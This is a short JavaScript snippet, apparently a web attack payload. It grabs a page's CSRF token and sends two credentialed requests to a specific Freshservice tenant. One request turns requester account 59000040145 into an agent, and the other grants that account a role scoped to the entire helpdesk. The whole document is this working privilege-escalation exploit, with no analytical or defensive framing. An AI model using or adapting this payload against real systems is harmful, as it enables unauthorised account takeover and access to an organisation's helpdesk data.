async function sendRequests() {
    try {
        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

        // Execute POST request
        await fetch('https://msul.freshservice.com/itil/requesters/59000040145/make_agent', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Csrf-Token': csrfToken
            },
            body: '_method=put'
        });

        // Execute PUT request
        await fetch('https://msul.freshservice.com/api/_/agents/59000040145/map_workspace_groups_and_roles', {
            method: 'PUT',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrfToken
            },
            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000018262,"assignment_scope":"entire_helpdesk"}],"workspace_id":1}`
        });

        console.log('Requests completed successfully');
    } catch (error) {
        console.error('Error:', error);
    }
}

sendRequests();
